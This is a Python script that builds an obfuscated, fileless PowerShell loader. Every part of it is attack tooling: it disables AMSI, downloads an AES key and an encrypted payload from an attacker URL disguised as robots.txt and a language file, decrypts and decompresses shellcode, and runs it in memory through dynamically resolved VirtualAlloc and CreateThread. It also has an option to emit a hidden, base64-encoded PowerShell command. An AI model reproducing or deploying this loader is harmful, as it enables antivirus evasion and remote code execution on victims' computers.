#!/usr/bin/env python3
# fileless ps cradle - no Add-Type, no csc.exe
# uses Reflection.Emit and Win32Native.GetProcAddress
# we needs pack.py output (english.lang and robots.txt)

import argparse, base64, random, string, sys

def rv(n=6):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def obf(s):
    # char concat to avoid string signatures
    return '+'.join(f'[char]{ord(c)}' for c in s)

def generate_cradle(base_url):
    v = {k: rv() for k in [
        'wc','kh','key','blob','os','iv','enc','aes','dec','ms','cs',
        'dr','dl','comp','msc','dfl','sc','tr','r','mem','th','old',
        'M','gm','gpa','w32n','mb','i','vad','vpd','ctd','fva','fvp','fct'
    ]}
    mkd = rv()

    lines = []
    lines.append("$ProgressPreference='SilentlyContinue';$ErrorActionPreference='Continue'")
    # amsi bypass
    lines.append(f"try{{$t=[Ref].Assembly.GetType(({obf('System.Management.Automation.AmsiUtils')}));$f=$t.GetField(({obf('amsiInitFailed')}),'NonPublic,Static');$f.SetValue($null,$true)}}catch{{}}")
    # download key + payload
    lines.append(f"${v['wc']}=New-Object Net.WebClient;${v['wc']}.Proxy=[Net.GlobalProxySelection]::GetEmptyWebProxy();${v['wc']}.Headers.Add('User-Agent','Mozilla/5.0')")
    lines.append(f"try{{${v['kh']}=${v['wc']}.DownloadString('{base_url}/robots.txt').Trim()}}catch{{return}}")
    lines.append(f"if(-not ${v['kh']} -or ${v['kh']}.Length -lt 64){{return}}")
    lines.append(f"${v['key']}=[byte[]]::new(32);for(${v['i']}=0;${v['i']} -lt 32;${v['i']}++){{${v['key']}[${v['i']}]=[Convert]::ToByte(${v['kh']}.Substring(${v['i']}*2,2),16)}}")
    lines.append(f"try{{${v['blob']}=${v['wc']}.DownloadData('{base_url}/english.lang')}}catch{{return}};${v['wc']}.Dispose()")
    lines.append(f"if(-not ${v['blob']} -or ${v['blob']}.Length -lt 25){{return}}")
    # decrypt aes
    lines.append(f"${v['os']}=[BitConverter]::ToUInt32(${v['blob']},0);${v['iv']}=${v['blob']}[8..23];${v['enc']}=${v['blob']}[24..(${v['blob']}.Length-1)]")
    lines.append(f"${v['aes']}=[Security.Cryptography.Aes]::Create();${v['aes']}.Mode='CBC';${v['aes']}.Padding='PKCS7';${v['aes']}.KeySize=256;${v['aes']}.Key=${v['key']};${v['aes']}.IV=${v['iv']}")
    lines.append(f"${v['dec']}=${v['aes']}.CreateDecryptor();${v['ms']}=New-Object IO.MemoryStream(,${v['enc']});${v['cs']}=New-Object Security.Cryptography.CryptoStream(${v['ms']},${v['dec']},[Security.Cryptography.CryptoStreamMode]::Read)")
    lines.append(f"${v['dr']}=New-Object byte[] ${v['enc']}.Length;${v['dl']}=${v['cs']}.Read(${v['dr']},0,${v['dr']}.Length);${v['cs']}.Dispose();${v['ms']}.Dispose();${v['aes']}.Dispose()")
    lines.append(f"if(${v['dl']} -le 0){{return}}")
    # decompress
    lines.append(f"${v['comp']}=${v['dr']}[0..(${v['dl']}-1)];[Array]::Clear(${v['key']},0,32)")
    lines.append(f"${v['msc']}=New-Object IO.MemoryStream(,${v['comp']}[2..(${v['comp']}.Length-1)]);${v['dfl']}=New-Object IO.Compression.DeflateStream(${v['msc']},[IO.Compression.CompressionMode]::Decompress)")
    lines.append(f"${v['sc']}=New-Object byte[] ${v['os']};${v['tr']}=0;while(${v['tr']} -lt ${v['os']}){{${v['r']}=${v['dfl']}.Read(${v['sc']},${v['tr']},${v['os']}-${v['tr']});if(${v['r']} -eq 0){{break}};${v['tr']}+=${v['r']}}};${v['dfl']}.Dispose();${v['msc']}.Dispose()")
    lines.append(f"if(${v['tr']} -le 0){{return}}")
    lines.append(f"[Array]::Clear(${v['comp']},0,${v['comp']}.Length);[Array]::Clear(${v['dr']},0,${v['dr']}.Length)")
    # get kernel32 + build delegates
    lines.append(f"${v['M']}=[Runtime.InteropServices.Marshal]")
    lines.append(f"${v['gm']}=([Diagnostics.Process]::GetCurrentProcess().Modules|?{{$_.ModuleName -eq 'kernel32.dll'}}).BaseAddress")
    lines.append(f"${v['w32n']}=[Reflection.Assembly]::GetAssembly([IntPtr]).GetType(({obf('Microsoft.Win32.Win32Native')}))")
    lines.append(f"if(-not ${v['w32n']}){{return}}")
    lines.append(f"${v['gpa']}=${v['w32n']}.GetMethod(({obf('GetProcAddress')}),[Reflection.BindingFlags]'NonPublic,Static',$null,[Type[]]@([IntPtr],[String]),$null)")
    lines.append(f"if(-not ${v['gpa']}){{return}}")
    lines.append(f"${v['mb']}=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('D')),[Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('M')")
    lines.append(f"function {mkd}($p,$r){{$t=${v['mb']}.DefineType('T'+[guid]::NewGuid().ToString('N'),'Public,Sealed',[MulticastDelegate]);$t.DefineConstructor('Public,HideBySig,SpecialName,RTSpecialName',[Reflection.CallingConventions]::Standard,$p).SetImplementationFlags('Runtime,Managed');$t.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$r,$p).SetImplementationFlags('Runtime,Managed');$t.CreateType()}}")
    lines.append(f"${v['vad']}={mkd} @([IntPtr],[UInt32],[UInt32],[UInt32]) ([IntPtr])")
    lines.append(f"${v['vpd']}={mkd} @([IntPtr],[UInt32],[UInt32],[IntPtr]) ([Bool])")
    lines.append(f"${v['ctd']}={mkd} @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr]) ([IntPtr])")
    lines.append(f"${v['fva']}=${v['M']}::GetDelegateForFunctionPointer(${v['gpa']}.Invoke($null,@(${v['gm']},'VirtualAlloc')),${v['vad']})")
    lines.append(f"${v['fvp']}=${v['M']}::GetDelegateForFunctionPointer(${v['gpa']}.Invoke($null,@(${v['gm']},'VirtualProtect')),${v['vpd']})")
    lines.append(f"${v['fct']}=${v['M']}::GetDelegateForFunctionPointer(${v['gpa']}.Invoke($null,@(${v['gm']},'CreateThread')),${v['ctd']})")
    # exec
    lines.append(f"${v['mem']}=${v['fva']}.Invoke([IntPtr]::Zero,[uint32]${v['sc']}.Length,0x3000,0x04)")
    lines.append(f"if(${v['mem']} -eq [IntPtr]::Zero){{return}}")
    lines.append(f"${v['M']}::Copy(${v['sc']},0,${v['mem']},${v['sc']}.Length);[Array]::Clear(${v['sc']},0,${v['sc']}.Length)")
    lines.append(f"${v['old']}=${v['M']}::AllocHGlobal(4);${v['fvp']}.Invoke(${v['mem']},[uint32]${v['sc']}.Length,0x20,${v['old']})|Out-Null;${v['M']}::FreeHGlobal(${v['old']})")
    lines.append(f"${v['th']}=${v['fct']}.Invoke([IntPtr]::Zero,0,${v['mem']},[IntPtr]::Zero,0,[IntPtr]::Zero)")
    lines.append(f"if(${v['th']} -eq [IntPtr]::Zero){{return}}")
    lines.append("while($true){Start-Sleep -Seconds 60}")

    return ';'.join(lines)


if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('url')
    p.add_argument('-o', '--output')
    p.add_argument('--encoded', action='store_true')
    args = p.parse_args()

    url = args.url.rstrip('/')
    cradle = generate_cradle(url)

    if args.encoded:
        b64 = base64.b64encode(cradle.encode('utf-16-le')).decode()
        out = f'powershell -nop -w hidden -enc {b64}'
    else:
        out = cradle

    if args.output:
        open(args.output, 'w').write(out)
        print(f"wrote {args.output} ({len(out)} chars)", file=sys.stderr)
    else:
        print(out)
